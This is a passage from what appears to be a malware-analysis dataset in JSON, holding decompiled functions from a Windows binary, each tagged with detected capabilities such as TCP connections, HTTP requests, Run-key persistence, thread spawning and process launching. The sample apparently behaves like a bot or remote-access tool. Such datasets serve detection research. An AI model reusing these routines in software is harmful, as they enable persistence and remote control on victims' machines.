sub.user32.dll_TranslateMessage(0x4987e8);\n        uVar7 = 0x4987e8;\n        sub.user32.dll_DispatchMessageA();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.0040546c(0x47dfd1, uVar6, uVar7);\n    fcn.00406a20();\n    fcn.00405490();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 846
    },
    "0047eb4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047eb4c(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x47ecd7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x47eb78;\n    uVar1 = fcn.00488e94();\n    puStack48 = 0x47eb84;\n    uVar2 = fcn.00488e94();\n    puStack48 = 0x47eb95;\n    fcn.00488e9c();\n    puStack48 = 0x47eba6;\n    fcn.00488e9c();\n    puStack48 = 0x47ebb3;\n    fcn.0042915c();\n    puStack48 = 0x47ebb8;\n    fcn.00424c44();\n    puStack48 = 0x47ebc2;\n    fcn.0042915c();\n    puStack48 = 0x47ebc7;\n    fcn.00424c44();\n    uStack52 = 0x47ecc6;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(**0x498960 + 0x40))();\n    (**(**0x498960 + 0x34))();\n    uVar3 = (**(**0x498960 + 0x20))(*0x498988, uVar1, uVar2, 0xcc0020);\n    uVar3 = (**(**0x498960 + 0x2c))(uVar3);\n    fcn.0042915c(uVar1, uVar2, uVar3);\n    uVar3 = fcn.00424ec0();\n    sub.gdi32.dll_BitBlt(uVar3);\n    uVar1 = (**(**0x498960 + 0x20))(*0x498988, uVar1, uVar2, 0xcc0020);\n    uVar1 = (**(**0x498960 + 0x2c))(uVar1);\n    fcn.0042915c(0, 0, uVar1);\n    uVar1 = fcn.00424ec0();\n    sub.gdi32.dll_BitBlt();\n    fcn.0041b8b8();\n    (**(**0x498960 + 0x58))();\n    *in_FS_OFFSET = uVar1;\n    fcn.0042915c(0x47eccd);\n    fcn.00424db4();\n    fcn.0042915c();\n    fcn.00424db4();\n    return;\n}\n",
        "token_count": 672
    },
    "00480d18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00480d18 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack44 = 0x480e2c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b724();\n    if (_var_18h == *0x480e48) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x480e4c;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x480e50;\n    } while (*0x480e48 < _var_18h);\n    fcn.00472b58();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 391
    },
    "00481004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "receive data",
            "receive data on socket",
            "connect TCP socket",
            "act as TCP client"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00481004 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1484;\n    uint uStack1480;\n    uchar *puStack1476;\n    uint var_5b4h;\n    uint var_5b0h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a0h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1476 = &stack0xfffffffc;\n    var_5b4h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1480 = 0x481189;\n    uStack1484 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1484;\n    fcn.00405664();\n    fcn.00405a48(&var_5b4h);\n    fcn.00405964();\n    var_10h = fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    uVar1 = fcn.00409e54();\n    fcn.00480f28();\n    iVar2 = sub.wsock32.dll_WSAStartup(2, &var_1a0h);\n    if (iVar2 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    iVar2 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar2 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403aac();\n    var_1b0h._0_2_ = 2;\n    uVar3 = fcn.00489450();\n    var_1ach = sub.wsock32.dll_inet_addr(uVar3);\n    var_1b0h._2_2_ = sub.wsock32.dll_htons(uVar1);\n    iVar4 = sub.wsock32.dll_connect(iVar2, &var_1b0h, 0x10);\n    if (iVar4 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00480e84();\n    sub.wsock32.dll_recv(iVar2, &var_5b0h, 0x400, 0);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar2);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 662
    },
    "004811a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004811a4 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack44 = 0x4812b8;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b724();\n    if (_var_18h == *0x4812d4) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x4812d8;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x4812dc;\n    } while (*0x4812d4 < _var_18h);\n    fcn.00472b58();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 393
    },
    "00481620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00481620(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x481639;\n    fcn.004058ec();\n    uStack36 = 0x481692;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0xc);\n    fcn.004054c0();\n    *(iVar1 + 4) = param_2;\n    *(iVar1 + 8) = var_8h;\n    uVar2 = 0;\n    sub.kernel32.dll_CreateThread(0, 0, fcn.00481514, iVar1, 0, &fcn.00481620::var_ch);\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x481699);\n    return;\n}\n",
        "token_count": 273
    },
    "00481c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481c60 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack468;\n    uint uStack464;\n    uchar *puStack460;\n    uint uStack456;\n    uint uStack452;\n    uchar *puStack448;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack460 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack448 = 0x481c88;\n    fcn.00405f08();\n    uStack452 = 0x481da0;\n    uStack456 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe38;\n    uStack464 = 0x481d56;\n    uStack468 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe2c;\n    puStack448 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    sub.wsock32.dll_WSAStartup(0x101, &fcn.00481c60::var_1a8h);\n    uVar1 = fcn.004058fc();\n    var_14h = sub.wsock32.dll_inet_addr(uVar1);\n    iVar2 = sub.wsock32.dll_gethostbyaddr(&fcn.00481c60::var_14h, 4, 2);\n    uVar3 = iVar2 == 0;\n    if (!uVar3) {\n        fcn.0040aa8c(0x481db8, var_4h, *0x49eb90);\n        fcn.00405800(0x481dc4, 0);\n    }\n    fcn.00405894();\n    if (uVar3) {\n        *0x492568 = 0;\n        *0x492564 = 1;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 481
    },
    "00482454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482454(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x482472;\n    fcn.004058ec();\n    puStack32 = 0x48247a;\n    fcn.004058ec();\n    puStack32 = 0x482482;\n    fcn.004058ec();\n    puStack32 = 0x48248a;\n    fcn.004058ec();\n    uVar1 = 1;\n    uStack36 = 0x482557;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00405894();\n    fcn.00405894();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405504();\n    }\n    fcn.00405894();\n    if (uVar1) {\n        fcn.00405504();\n    }\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042187c();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48255e;\n    uStack36 = 0x48254e;\n    fcn.00405490();\n    uStack36 = 0x482556;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 384
    },
    "004825b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.004825b8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x4825d1;\n    fcn.004058ec();\n    uStack36 = 0x482675;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x482650;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00405504();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.00421ad8();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack52;\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48267c;\n    uStack36 = 0x482674;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 288
    },
    "0048284c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048284c(void)\n\n{\n    uint32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x48290f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    arg_ch = *0x482970;\n    arg_8h = &var_8h;\n    fcn.0040f1a8();\n    fcn.00405784();\n    fcn.0040eeb8(arg_8h, arg_ch);\n    fcn.00405504();\n    fcn.0042187c();\n    fcn.00404640();\n    *in_FS_OFFSET = arg_8h;\n    iStack36 = 0x482916;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 297
    },
    "00488614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create HTTP request",
            "connect to URL"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00488755)\n\nvoid __cdecl fcn.00488614(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1128;\n    uint uStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uint uStack1096;\n    uint uStack1092;\n    uchar *puStack1088;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack1088 = &stack0xfffffffc;\n    puStack1076 = 0x488642;\n    fcn.00405f08();\n    uStack1080 = 0x4887ae;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbc4;\n    uStack1092 = 0x48875f;\n    uStack1096 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbb8;\n    uStack1100 = 0x48866d;\n    puStack1076 = &stack0xfffffffc;\n    fcn.0040858c();\n    uStack1100 = 0x488677;\n    fcn.00405504();\n    arg_8h_00 = *(arg_8h + 4);\n    uStack1100 = 0x48869f;\n    fcn.00403aac();\n    uStack1100 = 0;\n    uStack1104 = 0;\n    uStack1108 = 0;\n    uStack1112 = 0;\n    uStack1116 = 0x4887c0;\n    puStack1120 = 0x4886b1;\n    uVar1 = sub.wininet.dll_InternetOpenA();\n    uStack1124 = 0x488745;\n    uStack1128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffb98;\n    puStack1120 = &stack0xfffffffc;\n    uVar2 = fcn.004058fc(0, 0, 0, 0);\n    uVar2 = sub.wininet.dll_InternetOpenUrlA(uVar1, uVar2);\n    sub.wininet.dll_InternetCloseHandle();\n    *in_FS_OFFSET = uVar2;\n    sub.wininet.dll_InternetCloseHandle(uVar1, 0x48874c);\n    uVar4 = 0x4887d4;\n    uVar3 = 0;\n    uVar2 = 0x4887fc;\n    uVar1 = 0;\n    fcn.00409dd4(arg_8h_00);\n    fcn.00405800(0x488808, 0, arg_8h_00, uVar1, uVar2, uVar3, uVar4);\n    fcn.00472b58();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 768
    },
    "0048882c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "receive data",
            "receive data on socket",
            "connect TCP socket",
            "act as TCP client"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0048882c noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1472;\n    uint uStack1468;\n    uchar *puStack1464;\n    uint var_5a8h;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_198h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1464 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack1468 = 0x488944;\n    uStack1472 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1472;\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_WSAStartup(2, &var_198h);\n    if (iVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00403aac();\n    var_1a8h._0_2_ = 2;\n    uVar2 = fcn.00489450();\n    var_1a4h = sub.wsock32.dll_inet_addr(uVar2);\n    var_1a8h._2_2_ = sub.wsock32.dll_htons(0x50);\n    iVar3 = sub.wsock32.dll_connect(iVar1, &var_1a8h, 0x10);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread(0);\n    }\n    fcn.00472bec();\n    sub.wsock32.dll_recv(iVar1, &var_5a8h, 0x400, 0);\n    fcn.00405664();\n    sub.kernel32.dll_Sleep_1(1000);\n    sub.wsock32.dll_closesocket(iVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 541
    },
    "00488974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00488974 noreturn (uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_1ch = 0;\n    var_4h = 0;\n    uStack44 = 0x488a88;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.00405664();\n    fcn.00405a48(&var_1ch);\n    fcn.00405964();\n    fcn.004058fc();\n    fcn.00405a48();\n    fcn.004059a4();\n    _var_18h = fcn.0040b724();\n    if (_var_18h == *0x488aa4) {\n        _var_18h = CONCAT28(0x4020, 0x9502f8ffc0000000);\n    }\n    _var_18h = _var_18h * *0x488aa8;\n    do {\n        sub.kernel32.dll_Sleep_1(100);\n        sub.kernel32.dll_CreateThread();\n        _var_18h = _var_18h - *0x488aac;\n    } while (*0x488aa4 < _var_18h);\n    fcn.00472b58();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 387
    },
    "00488d78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.00488d78(void)\n\n{\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack36 = 0x488d91;\n    fcn.004058ec();\n    uStack40 = 0x488e6a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x488dab;\n    puStack36 = &stack0xfffffffc;\n    piVar1 = fcn.00428b88();\n    uStack52 = 0x488e45;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x488e15;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    (**(*piVar1 + 0x4c))();\n    fcn.00462824();\n    fcn.00488b14();\n    fcn.00405738();\n    (**(*piVar1 + 0x50))();\n    *in_FS_OFFSET = uStack68;\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x488e4c;\n    uStack52 = 0x488e44;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 397
    },
    "00488f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00488f48(void)\n\n{\n    int32_t iVar1;\n    uint32_t auStack8 [2];\n    \n    auStack8[0] = 8;\n    sub.user32.dll_GetLastInputInfo(auStack8);\n    iVar1 = sub.kernel32.dll_GetTickCount_1();\n    return (iVar1 - auStack8[0]) / 1000 | auStack8[0] << 0x20;\n}\n",
        "token_count": 100
    },
    "00489034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00489034(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    float10 fVar3;\n    uint *puVar4;\n    int32_t iStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    unkbyte10 Stack20;\n    uint var_5h;\n    \n    puStack96 = &stack0xfffffffc;\n    puStack84 = 0x48904d;\n    fcn.004058ec();\n    uStack88 = 0x4891e3;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    uStack100 = 0x4891b0;\n    iStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puVar4 = &fcn.00489034::var_18h;\n    puStack84 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(puVar4, &fcn.00489034::var_20h, &fcn.00489034::var_28h);\n    iVar2 = (***0x4927c8)(uVar1);\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            _var_38h = CONCAT44(var_1ch, var_20h);\n        }\n        else if (param_2 == '\\x01') {\n            _var_38h = CONCAT44(var_24h, var_28h);\n        }\n        else if (param_2 == '\\x02') {\n            _var_38h = CONCAT44((var_1ch - var_24h) - (var_20h < var_28h), var_20h - var_28h);\n        }\n        else {\n            _var_38h = CONCAT44(var_1ch, var_20h);\n        }\n        if (var_5h < 5) {\n    // switch table (5 cases) at 0x4890e4\n            switch(*(var_5h * 4 + 0x4890e4)) {\n            case 0x4890f8:\n                break;\n            case 0x489111:\n                fVar3 = fcn.0042c504(0x3f800000, 0x44800000);\n                _var_38h = _var_38h / fVar3;\n                break;\n            case 0x48912b:\n                fVar3 = fcn.0042c504(0x40000000, 0x44800000);\n                _var_38h = _var_38h / fVar3;\n                break;\n            case 0x489145:\n                fVar3 = fcn.0042c504(0x40400000, 0x44800000);\n                _var_38h = _var_38h / fVar3;\n                break;\n            case 0x48915f:\n                fVar3 = fcn.0042c504(0x40800000, 0x44800000);\n                _var_38h = _var_38h / fVar3;\n            }\n        }\n        else {\n            fVar3 = fcn.0042c504(0x40000000, 0x44800000);\n            _var_38h = _var_38h / fVar3;\n        }\n    }\n    iVar2 = SUB84(_var_38h, 0);\n    Stack20 = fcn.0042c48c();\n    *in_FS_OFFSET = iVar2;\n    *in_FS_OFFSET = puVar4;\n    fcn.0040546c(0x4891ea);\n    return;\n}\n",
        "token_count": 944
    },
    "004891f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004891f4(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    puStack76 = 0x489208;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack80 = 0x489277;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.00403aac();\n    pExecInfo = 0x3c;\n    var_3ch = 0x500;\n    var_30h = fcn.004058fc();\n    var_34h = 0x489284;\n    var_2ch = 0x48928c;\n    var_24h = 1;\n    sub.shell32.dll_ShellExecuteExA();\n    *in_FS_OFFSET = &fcn.004891f4::pExecInfo;\n    uStack80 = 0x48927e;\n    iStack84 = 0x489276;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 323
    },
    "00489290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489290(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uchar *puStack492;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack492 = 0x4892b4;\n    fcn.004058ec();\n    uStack496 = 0x489387;\n    uStack500 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe0c;\n    uStack508 = 0x489350;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    puStack492 = &stack0xfffffffc;\n    fcn.0040546c();\n    fcn.00403764();\n    fcn.00403500();\n    fcn.004033ac();\n    param_2 = param_2 + -2;\n    if (0 < param_2) {\n        do {\n            fcn.004033d4();\n            fcn.00405654();\n            fcn.00405738();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    fcn.00405bf0();\n    fcn.0040409c();\n    fcn.0040390c();\n    *in_FS_OFFSET = uStack512;\n    *in_FS_OFFSET = uStack500;\n    puStack492 = 0x48938e;\n    uStack496 = 0x489379;\n    fcn.0040546c();\n    uStack496 = 0x489386;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 423
    },
    "00489398": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00489398(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack52 = 0x4893af;\n    fcn.004058ec();\n    uStack56 = 0x489420;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403aac();\n    var_1eh = 3;\n    fcn.00405784();\n    var_1ah = fcn.004058fc();\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.00489398::lpFileOp;\n    uStack56 = 0x489427;\n    iStack60 = 0x489417;\n    fcn.0040546c();\n    iStack60 = 0x48941f;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 295
    },
    "00489878": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00489878(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x489888;\n    fcn.004058ec();\n    uStack20 = 0x4898de;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.0042144c();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4898e5;\n    uStack20 = 0x4898dd;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 192
    },
    "0048992c": {
        "rules": [
